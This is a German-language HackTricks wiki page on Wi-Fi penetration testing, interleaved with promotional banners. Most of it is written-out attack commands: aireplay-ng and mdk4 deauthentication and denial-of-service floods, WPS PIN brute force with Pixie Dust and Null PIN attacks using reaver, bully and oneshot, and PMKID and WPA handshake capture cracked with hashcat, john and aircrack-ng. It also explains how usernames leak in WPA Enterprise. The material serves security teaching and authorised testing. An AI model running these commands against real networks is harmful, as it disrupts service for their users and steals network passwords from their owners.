# Pentesting Wifi

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Treten Sie dem [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) Server bei, um mit erfahrenen Hackern und Bug-Bounty-J√§gern zu kommunizieren!

**Hacking Einblicke**\
Engagieren Sie sich mit Inhalten, die in den Nervenkitzel und die Herausforderungen des Hackens eintauchen

**Echtzeit-Hack-Nachrichten**\
Bleiben Sie auf dem Laufenden √ºber die schnelllebige Hacking-Welt durch Echtzeit-Nachrichten und Einblicke

**Neueste Ank√ºndigungen**\
Bleiben Sie informiert √ºber die neuesten Bug-Bounties, die gestartet werden, und wichtige Plattform-Updates

**Treten Sie uns auf** [**Discord**](https://discord.com/invite/N3FrSbmwdy) bei und beginnen Sie noch heute mit den besten Hackern zusammenzuarbeiten!

## Wifi Grundbefehle
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Tools

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**F√ºhren Sie airgeddon mit Docker aus**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
From: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Es kann Evil Twin-, KARMA- und Known Beacons-Angriffe durchf√ºhren und dann eine Phishing-Vorlage verwenden, um das echte Passwort des Netzwerks zu erhalten oder Anmeldeinformationen von sozialen Netzwerken zu erfassen.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Dieses Tool automatisiert **WPS/WEP/WPA-PSK** Angriffe. Es wird automatisch:

* Die Schnittstelle in den √úberwachungsmodus versetzen
* Nach m√∂glichen Netzwerken scannen - Und Ihnen erlauben, die Opfer auszuw√§hlen
* Wenn WEP - WEP-Angriffe starten
* Wenn WPA-PSK
* Wenn WPS: Pixie Dust-Angriff und den Brute-Force-Angriff (seien Sie vorsichtig, der Brute-Force-Angriff kann lange dauern). Beachten Sie, dass es keinen Null-PIN oder Datenbank/erzeugte PINs versucht.
* Versuchen, die PMKID vom AP zu erfassen, um sie zu knacken
* Versuchen, Clients des APs zu deauthentifizieren, um einen Handshake zu erfassen
* Wenn PMKID oder Handshake, versuchen, mit den Top5000 Passw√∂rtern zu bruteforcen.

## Angriffs√ºbersicht

* **DoS**
* Deauthentication/Disassociation -- Alle (oder ein bestimmtes ESSID/Client) trennen
* Zuf√§llige gef√§lschte APs -- Netzwerke verstecken, m√∂gliche Scanner zum Absturz bringen
* AP √ºberlasten -- Versuchen, den AP abzuschalten (normalerweise nicht sehr n√ºtzlich)
* WIDS -- Mit dem IDS spielen
* TKIP, EAPOL -- Einige spezifische Angriffe, um einige APs zu DoS
* **Cracking**
* **WEP** knacken (mehrere Tools und Methoden)
* **WPA-PSK**
* **WPS** PIN "Brute-Force"
* **WPA PMKID** Brute-Force
* \[DoS +] **WPA Handshake** erfassen + Knacken
* **WPA-MGT**
* **Benutzername erfassen**
* **Bruteforce** Anmeldeinformationen
* **Evil Twin** (mit oder ohne DoS)
* **Offenes** Evil Twin \[+ DoS] -- N√ºtzlich, um Anmeldeinformationen f√ºr das Captive Portal zu erfassen und/oder LAN-Angriffe durchzuf√ºhren
* **WPA-PSK** Evil Twin -- N√ºtzlich f√ºr Netzwerkangriffe, wenn Sie das Passwort kennen
* **WPA-MGT** -- N√ºtzlich, um Unternehmensanmeldeinformationen zu erfassen
* **KARMA, MANA**, **Loud MANA**, **Bekannter Beacon**
* **+ Offen** -- N√ºtzlich, um Anmeldeinformationen f√ºr das Captive Portal zu erfassen und/oder LAN-Angriffe durchzuf√ºhren
* **+ WPA** -- N√ºtzlich, um WPA Handshakes zu erfassen

## DOS

### Deauthentication-Pakete

**Beschreibung von** [**hier**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication**-Angriffe, eine verbreitete Methode im Wi-Fi-Hacking, beinhalten das F√§lschen von "Management"-Frames, um **Ger√§te gewaltsam von einem Netzwerk zu trennen**. Diese unverschl√ºsselten Pakete t√§uschen die Clients vor, dass sie vom legitimen Netzwerk stammen, was Angreifern erm√∂glicht, WPA-Handshakes zu sammeln, um sie zu knacken, oder um Netzwerkverbindungen dauerhaft zu st√∂ren. Diese Taktik, die in ihrer Einfachheit alarmierend ist, wird weit verbreitet eingesetzt und hat erhebliche Auswirkungen auf die Netzwerksicherheit.

**Deauthentication mit Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
* \-0 bedeutet Deauthentifizierung
* 1 ist die Anzahl der zu sendenden Deauths (du kannst mehrere senden, wenn du m√∂chtest); 0 bedeutet, sie kontinuierlich zu senden
* \-a 00:14:6C:7E:40:80 ist die MAC-Adresse des Access Points
* \-c 00:0F:B5:34:30:30 ist die MAC-Adresse des Clients, der deauthentifiziert werden soll; wenn dies weggelassen wird, wird eine Broadcast-Deauthentifizierung gesendet (funktioniert nicht immer)
* ath0 ist der Schnittstellenname

### Disassoziationspakete

**Disassoziationspakete**, √§hnlich wie Deauthentifizierungspakete, sind eine Art von Management-Frame, die in Wi-Fi-Netzwerken verwendet werden. Diese Pakete dienen dazu, die Verbindung zwischen einem Ger√§t (wie einem Laptop oder Smartphone) und einem Access Point (AP) zu trennen. Der Hauptunterschied zwischen Disassoziation und Deauthentifizierung liegt in ihren Nutzungsszenarien. W√§hrend ein AP **Deauthentifizierungspakete sendet, um unerw√ºnschte Ger√§te ausdr√ºcklich aus dem Netzwerk zu entfernen, werden Disassoziationspakete typischerweise gesendet, wenn der AP heruntergefahren wird**, neu gestartet wird oder sich bewegt, wodurch die Trennung aller verbundenen Knoten erforderlich wird.

**Dieser Angriff kann mit mdk4 (Modus "d") durchgef√ºhrt werden:**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Weitere DOS-Angriffe mit mdk4**

**In** [**hier**](https://en.kali.tools/?p=864)**.**

**ANGRIFFSMODUS b: Beacon Flooding**

Sendet Beacon-Frames, um gef√§lschte APs bei Clients anzuzeigen. Dies kann manchmal Netzwerk-Scanner und sogar Treiber zum Absturz bringen!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ANGRIFFSMODUS a: Authentifizierungs-Denial-of-Service**

Das Senden von Authentifizierungsrahmen an alle zug√§nglichen Access Points (APs) im Bereich kann diese APs √ºberlasten, insbesondere wenn zahlreiche Clients beteiligt sind. Dieser intensive Datenverkehr kann zu Systeminstabilit√§t f√ºhren, wodurch einige APs einfrieren oder sogar zur√ºckgesetzt werden.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ANGRIFFSMODUS p: SSID-Abfrage und Bruteforce**

Die Abfrage von Access Points (APs) √ºberpr√ºft, ob ein SSID ordnungsgem√§√ü angezeigt wird und best√§tigt die Reichweite des APs. Diese Technik, kombiniert mit **Bruteforce versteckter SSIDs** mit oder ohne Wortliste, hilft dabei, verborgene Netzwerke zu identifizieren und darauf zuzugreifen.

**ANGRIFFSMODUS m: Ausnutzung von Michael-Gegenma√ünahmen**

Das Senden von zuf√§lligen oder doppelten Paketen an verschiedene QoS-Warteschlangen kann die Michael-Gegenma√ünahmen bei **TKIP APs** ausl√∂sen, was zu einer einmin√ºtigen Abschaltung des APs f√ºhrt. Diese Methode ist eine effiziente Taktik f√ºr einen **DoS** (Denial of Service) Angriff.
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ANGRIFFSMODUS e: EAPOL Start- und Logoff-Paket-Injektion**

Das √úberfluten eines AP mit **EAPOL Start-Frames** erzeugt **falsche Sitzungen**, √ºberlastet den AP und blockiert legitime Clients. Alternativ f√ºhrt das Injizieren von **falschen EAPOL Logoff-Nachrichten** zu einer erzwungenen Trennung von Clients, wobei beide Methoden den Netzwerkdienst effektiv st√∂ren.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ANGRIFFSMODUS s: Angriffe auf IEEE 802.11s Mesh-Netzwerke**

Verschiedene Angriffe auf das Link-Management und das Routing in Mesh-Netzwerken.

**ANGRIFFSMODUS w: WIDS Verwirrung**

Das Querverbinden von Clients mit mehreren WDS-Knoten oder gef√§lschten b√∂sartigen APs kann Intrusion Detection und Prevention Systeme manipulieren, was zu Verwirrung und potenziellem Missbrauch des Systems f√ºhrt.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ANGRIFFSMODUS f: Paket-Fuzzer**

Ein Paket-Fuzzer mit verschiedenen Paketquellen und einem umfassenden Satz von Modifikatoren zur Paketmanipulation.

### **Airggedon**

_**Airgeddon**_ bietet die meisten der in den vorherigen Kommentaren vorgeschlagenen Angriffe an:

![](<../../.gitbook/assets/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) vereinfacht den Prozess der Verbindung von Ger√§ten mit einem Router und verbessert die Einrichtungsgeschwindigkeit und -einfachheit f√ºr Netzwerke, die mit **WPA** oder **WPA2** Personal verschl√ºsselt sind. Es ist ineffektiv f√ºr die leicht angreifbare WEP-Sicherheit. WPS verwendet eine 8-stellige PIN, die in zwei H√§lften validiert wird, was es anf√§llig f√ºr Brute-Force-Angriffe macht, aufgrund der begrenzten Anzahl von Kombinationen (11.000 M√∂glichkeiten).

### WPS Bruteforce

Es gibt 2 Hauptwerkzeuge, um diese Aktion durchzuf√ºhren: Reaver und Bully.

* **Reaver** wurde entwickelt, um einen robusten und praktischen Angriff gegen WPS durchzuf√ºhren und wurde gegen eine Vielzahl von Zugangspunkten und WPS-Implementierungen getestet.
* **Bully** ist eine **neue Implementierung** des WPS-Brute-Force-Angriffs, geschrieben in C. Es hat mehrere Vorteile gegen√ºber dem urspr√ºnglichen Reaver-Code: weniger Abh√§ngigkeiten, verbesserte Speicher- und CPU-Leistung, korrekte Handhabung der Endianness und ein robusteres Set von Optionen.

Der Angriff nutzt die **Anf√§lligkeit der WPS-PIN**, insbesondere die Offenlegung der ersten vier Ziffern und die Rolle der letzten Ziffer als Pr√ºfziffer, was den Brute-Force-Angriff erleichtert. Allerdings erfordern Abwehrma√ünahmen gegen Brute-Force-Angriffe, wie das **Blockieren von MAC-Adressen** aggressiver Angreifer, eine **MAC-Adressrotation**, um den Angriff fortzusetzen.

Nach dem Erhalt der WPS-PIN mit Werkzeugen wie Bully oder Reaver kann der Angreifer den WPA/WPA2 PSK ableiten, was **dauerhaften Netzwerkzugang** gew√§hrleistet.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

Dieser verfeinerte Ansatz zielt auf WPS-PINs ab, die bekannte Schwachstellen nutzen:

1. **Vorentdeckte PINs**: Nutzen Sie eine Datenbank mit bekannten PINs, die mit bestimmten Herstellern verkn√ºpft sind, die daf√ºr bekannt sind, einheitliche WPS-PINs zu verwenden. Diese Datenbank korreliert die ersten drei Oktette der MAC-Adressen mit wahrscheinlichen PINs f√ºr diese Hersteller.
2. **PIN-Generierungsalgorithmen**: Nutzen Sie Algorithmen wie ComputePIN und EasyBox, die WPS-PINs basierend auf der MAC-Adresse des APs berechnen. Der Arcadyan-Algorithmus erfordert zus√§tzlich eine Ger√§te-ID, was eine zus√§tzliche Ebene im PIN-Generierungsprozess hinzuf√ºgt.

### WPS Pixie Dust attack

**Dominique Bongard** entdeckte einen Fehler in einigen Access Points (APs) bez√ºglich der Erstellung von geheimen Codes, bekannt als **nonces** (**E-S1** und **E-S2**). Wenn diese nonces herausgefunden werden k√∂nnen, wird das Knacken des WPS-PINs des APs einfach. Der AP gibt den PIN innerhalb eines speziellen Codes (Hash) preis, um zu beweisen, dass er legitim und kein gef√§lschter (rogue) AP ist. Diese nonces sind im Wesentlichen die "Schl√ºssel", um den "Safe" zu √∂ffnen, der den WPS-PIN enth√§lt. Mehr dazu finden Sie [hier](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\)).

Einfach ausgedr√ºckt, besteht das Problem darin, dass einige APs nicht ausreichend zuf√§llige Schl√ºssel zur Verschl√ºsselung des PINs w√§hrend des Verbindungsprozesses verwendeten. Dies macht den PIN anf√§llig daf√ºr, von au√üerhalb des Netzwerks erraten zu werden (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Wenn Sie das Ger√§t nicht in den √úberwachungsmodus versetzen m√∂chten oder `reaver` und `bully` ein Problem haben, k√∂nnen Sie [OneShot-C](https://github.com/nikita-yfh/OneShot-C) ausprobieren. Dieses Tool kann den Pixie Dust-Angriff durchf√ºhren, ohne in den √úberwachungsmodus wechseln zu m√ºssen.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin Angriff

Einige schlecht gestaltete Systeme erlauben sogar einen **Null PIN** (einen leeren oder nicht vorhandenen PIN) den Zugang zu gew√§hren, was ziemlich ungew√∂hnlich ist. Das Tool **Reaver** ist in der Lage, diese Schwachstelle zu testen, im Gegensatz zu **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Alle vorgeschlagenen WPS-Angriffe k√∂nnen einfach mit _**airgeddon.**_ durchgef√ºhrt werden.

![](<../../.gitbook/assets/image (219).png>)

* 5 und 6 erm√∂glichen es dir, **deine benutzerdefinierte PIN** auszuprobieren (falls du eine hast)
* 7 und 8 f√ºhren den **Pixie Dust Angriff** durch
* 13 erlaubt es dir, die **NULL PIN** zu testen
* 11 und 12 werden **die PINs, die mit dem ausgew√§hlten AP aus verf√ºgbaren Datenbanken verbunden sind, sammeln** und **m√∂gliche PINs generieren** mit: ComputePIN, EasyBox und optional Arcadyan (empfohlen, warum nicht?)
* 9 und 10 testen **jede m√∂gliche PIN**

## **WEP**

So kaputt und heutzutage ungenutzt. Wisse einfach, dass _**airgeddon**_ eine WEP-Option namens "All-in-One" hat, um diese Art von Schutz anzugreifen. Mehr Tools bieten √§hnliche Optionen an.

![](<../../.gitbook/assets/image (432).png>)

***

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Tritt dem [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) Server bei, um mit erfahrenen Hackern und Bug-Bounty-J√§gern zu kommunizieren!

**Hacking Insights**\
Engagiere dich mit Inhalten, die in den Nervenkitzel und die Herausforderungen des Hackens eintauchen

**Echtzeit-Hack-Nachrichten**\
Bleibe auf dem Laufenden √ºber die schnelllebige Hackerwelt durch Echtzeitnachrichten und Einblicke

**Neueste Ank√ºndigungen**\
Bleibe informiert √ºber die neuesten Bug-Bounties, die gestartet werden, und wichtige Plattform-Updates

**Tritt uns bei** [**Discord**](https://discord.com/invite/N3FrSbmwdy) bei und beginne noch heute mit den besten Hackern zusammenzuarbeiten!

***

## WPA/WPA2 PSK

### PMKID

Im Jahr 2018 enth√ºllte **hashcat** [eine neue Angriffsmethode](https://hashcat.net/forum/thread-7717.html), die einzigartig ist, weil sie nur **ein einzelnes Paket** ben√∂tigt und keine Clients ben√∂tigt, die mit dem Ziel-AP verbunden sind ‚Äì nur Interaktion zwischen dem Angreifer und dem AP.

Viele moderne Router f√ºgen ein **optional Feld** zum **ersten EAPOL**-Frame w√§hrend der Assoziation hinzu, bekannt als `Robust Security Network`. Dies umfasst das `PMKID`.

Wie der urspr√ºngliche Beitrag erkl√§rt, wird das **PMKID** mit bekannten Daten erstellt:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Angesichts der Tatsache, dass der "PMK Name" konstant ist, kennen wir die BSSID des AP und der Station, und das `PMK` identisch mit dem aus einem vollst√§ndigen 4-Wege-Handshake ist, kann **hashcat** diese Informationen nutzen, um den PSK zu knacken und das Passwort wiederherzustellen!

Um diese Informationen zu **sammeln** und das Passwort lokal zu **bruteforcen**, k√∂nnen Sie Folgendes tun:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Die **erfassten PMKIDs** werden in der **Konsole** angezeigt und auch **gespeichert** in \_ **/tmp/attack.pcap**\_\
Jetzt, konvertiere die Erfassung in **hashcat/john** Format und knacken es:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Bitte beachten Sie, dass das Format eines korrekten Hashs **4 Teile** enth√§lt, wie: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838`. Wenn Ihrer **nur** **3 Teile** enth√§lt, dann ist es **ung√ºltig** (der PMKID-Capture war nicht g√ºltig).

Beachten Sie, dass `hcxdumptool` **auch Handshakes erfasst** (etwas wie dies wird erscheinen: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Sie k√∂nnten die **Handshakes** in **hashcat**/**john**-Format mit `cap2hccapx` **umwandeln**.
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_Ich habe festgestellt, dass einige Handshakes, die mit diesem Tool erfasst wurden, selbst bei Kenntnis des richtigen Passworts nicht geknackt werden konnten. Ich empfehle, Handshakes auch auf traditionelle Weise zu erfassen, wenn m√∂glich, oder mehrere davon mit diesem Tool zu erfassen._

### Handshake-Erfassung

Ein Angriff auf **WPA/WPA2**-Netzwerke kann durchgef√ºhrt werden, indem ein **Handshake** erfasst und versucht wird, das Passwort **offline** zu **knacken**. Dieser Prozess umfasst die √úberwachung der Kommunikation eines bestimmten Netzwerks und **BSSID** auf einem bestimmten **Kanal**. Hier ist eine vereinfachte Anleitung:

1. Identifizieren Sie die **BSSID**, den **Kanal** und einen **verbundenen Client** des Zielnetzwerks.
2. Verwenden Sie `airodump-ng`, um den Netzwerkverkehr auf dem angegebenen Kanal und der BSSID zu √ºberwachen, in der Hoffnung, einen Handshake zu erfassen. Der Befehl sieht folgenderma√üen aus:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Um die Wahrscheinlichkeit zu erh√∂hen, einen Handshake zu erfassen, trennen Sie den Client vor√ºbergehend vom Netzwerk, um eine erneute Authentifizierung zu erzwingen. Dies kann mit dem Befehl `aireplay-ng` durchgef√ºhrt werden, der Deauthentifizierungs-Pakete an den Client sendet:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Beachten Sie, dass der Client, als er deauthentifiziert wurde, versuchen k√∂nnte, sich mit einem anderen AP oder in anderen F√§llen mit einem anderen Netzwerk zu verbinden._

Sobald im `airodump-ng` einige Handshake-Informationen erscheinen, bedeutet dies, dass der Handshake erfasst wurde und Sie das Lauschen stoppen k√∂nnen:

![](<../../.gitbook/assets/image (172) (1).png>)

Sobald der Handshake erfasst ist, k√∂nnen Sie ihn mit `aircrack-ng` **knacken**:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### √úberpr√ºfen, ob Handshake in der Datei

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Wenn dieses Tool einen unvollst√§ndigen Handshake eines ESSID vor dem vollst√§ndigen findet, wird es den g√ºltigen nicht erkennen._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

In **unternehmerischen WiFi-Setups werden Sie auf verschiedene Authentifizierungsmethoden sto√üen**, die jeweils unterschiedliche Sicherheitsniveaus und Verwaltungsfunktionen bieten. Wenn Sie Tools wie `airodump-ng` verwenden, um den Netzwerkverkehr zu inspizieren, k√∂nnten Sie Bezeichner f√ºr diese Authentifizierungstypen bemerken. Einige g√§ngige Methoden sind:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
* Diese Methode unterst√ºtzt Hardware-Token und Einmalpassw√∂rter innerhalb von EAP-PEAP. Im Gegensatz zu MSCHAPv2 verwendet sie keine Peer-Herausforderung und sendet Passw√∂rter im Klartext an den Access Point, was ein Risiko f√ºr Downgrade-Angriffe darstellt.
2. **EAP-MD5 (Message Digest 5)**:
* Beinhaltet das Senden des MD5-Hashes des Passworts vom Client. Es wird **nicht empfohlen**, da es anf√§llig f√ºr W√∂rterbuchangriffe ist, keine Serverauthentifizierung bietet und keine sitzungsbezogenen WEP-Schl√ºssel generieren kann.
3. **EAP-TLS (Transport Layer Security)**:
* Nutzt sowohl clientseitige als auch serverseitige Zertifikate zur Authentifizierung und kann dynamisch benutzerbasierte und sitzungsbasierte WEP-Schl√ºssel zur Sicherung der Kommunikation generieren.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
* Bietet gegenseitige Authentifizierung durch einen verschl√ºsselten Tunnel sowie eine Methode zur Ableitung dynamischer, benutzer- und sitzungsbezogener WEP-Schl√ºssel. Es erfordert nur serverseitige Zertifikate, wobei die Clients Anmeldeinformationen verwenden.
5. **PEAP (Protected Extensible Authentication Protocol)**:
* Funktioniert √§hnlich wie EAP, indem es einen TLS-Tunnel f√ºr gesch√ºtzte Kommunikation erstellt. Es erlaubt die Verwendung schw√§cherer Authentifizierungsprotokolle √ºber EAP, aufgrund des durch den Tunnel gebotenen Schutzes.
* **PEAP-MSCHAPv2**: Oft als PEAP bezeichnet, kombiniert es den anf√§lligen MSCHAPv2 Challenge/Response-Mechanismus mit einem sch√ºtzenden TLS-Tunnel.
* **PEAP-EAP-TLS (oder PEAP-TLS)**: √Ñhnlich wie EAP-TLS, initiiert jedoch einen TLS-Tunnel, bevor Zertifikate ausgetauscht werden, und bietet eine zus√§tzliche Sicherheitsebene.

Sie finden weitere Informationen zu diesen Authentifizierungsmethoden [hier](https://en.wikipedia.org/wiki/Extensible\_Authentication\_Protocol) und [hier](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Username Capture

Laut [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) sieht es so aus, als ob, wenn Sie **EAP** verwenden, die **"Identit√§ts"** **Nachrichten** **unterst√ºtzt** werden m√ºssen, und der **Benutzername** wird im **"Response Identity"** Nachrichten im **Klartext** gesendet.

Selbst bei Verwendung einer der sichersten Authentifizierungsmethoden: **PEAP-EAP-TLS**, ist es m√∂glich, den **Benutzernamen, der im EAP-Protokoll gesendet wird, zu erfassen**. Um dies zu tun, **fangen Sie eine Authentifizierungscommunication** (starten Sie `airodump-ng` in einem Kanal und `wireshark` in derselben Schnittstelle) und filtern Sie die Pakete nach `eapol`.\
Innerhalb des "**Response, Identity**" Pakets wird der **Benutzername** des Clients erscheinen.

![](<../../.gitbook/assets/image (850).png>)

### Anonyme Identit√§ten

Die Identit√§tsverbergung wird sowohl von EAP-PEAP als auch von EAP-TTLS unterst√ºtzt. Im Kontext eines WiFi-Netzwerks wird eine EAP-Identit√§tsanfrage typischerweise vom Access Point (AP) w√§hrend des Assoziationsprozesses initiiert. Um den Schutz der Anonymit√§t der Benutzer zu gew√§hrleisten, enth√§lt die Antwort des EAP-Clients auf dem Ger√§t des Benutzers nur die wesentlichen Informationen, die der anf√§ngliche RADIUS-Server ben√∂tigt, um die Anfrage zu verarbeiten. Dieses Konzept wird durch die folgenden Szenarien veranschaulicht:

* EAP-Identit√§t = anonym
* In diesem Szenario verwenden alle Benutzer das pseudonyme "anonym" als ihre Benutzerkennung. Der anf√§ngliche RADIUS-Server fungiert entweder als EAP-PEAP oder EAP-TTLS-Server, der f√ºr die Verwaltung der serverseitigen PEAP- oder TTLS-Protokolle verantwortlich ist. Die innere (gesch√ºtzte) Authentifizierungsmethode wird dann entweder lokal behandelt oder an einen entfernten (Heim-) RADIUS-Server delegiert.
* EAP-Identit√§t = anonym@realm\_x
* In dieser Situation verbergen Benutzer aus verschiedenen Bereichen ihre Identit√§ten, w√§hrend sie ihre jeweiligen Bereiche angeben. Dies erm√∂glicht es dem anf√§nglichen RADIUS-Server, die EAP-PEAP- oder EAP-TTLS-Anfragen an RADIUS-Server in ihren Heimatbereichen weiterzuleiten, die als PEAP- oder TTLS-Server fungieren. Der anf√§ngliche RADIUS-Server fungiert ausschlie√ülich als RADIUS-Relay-Knoten.
* Alternativ kann der anf√§ngliche RADIUS-Server als EAP-PEAP- oder EAP-TTLS-Server fungieren und entweder die gesch√ºtzte Authentifizierungsmethode behandeln oder an einen anderen Server weiterleiten. Diese Option erleichtert die Konfiguration unterschiedlicher Richtlinien f√ºr verschiedene Bereiche.

In EAP-PEAP, sobald der TLS-Tunnel zwischen dem PEAP-Server und dem PEAP-Client eingerichtet ist, initiiert der PEAP-Server eine EAP-Identit√§tsanfrage und √ºbertr√§gt sie durch den TLS-Tunnel. Der Client antwortet auf diese zweite EAP-Identit√§tsanfrage, indem er eine EAP-Identit√§tsantwort sendet, die die wahre Identit√§t des Benutzers durch den verschl√ºsselten Tunnel enth√§lt. Dieser Ansatz verhindert effektiv die Offenlegung der tats√§chlichen Identit√§t des Benutzers gegen√ºber jedem, der den 802.11-Verkehr abh√∂rt.

EAP-TTLS folgt einem etwas anderen Verfahren. Bei EAP-TTLS authentifiziert sich der Client typischerweise mit PAP oder CHAP, gesichert durch den TLS-Tunnel. In diesem Fall enth√§lt der Client ein User-Name-Attribut und entweder ein Passwort- oder CHAP-Passwort-Attribut in der ersten TLS-Nachricht, die nach der Tunnelherstellung gesendet wird.
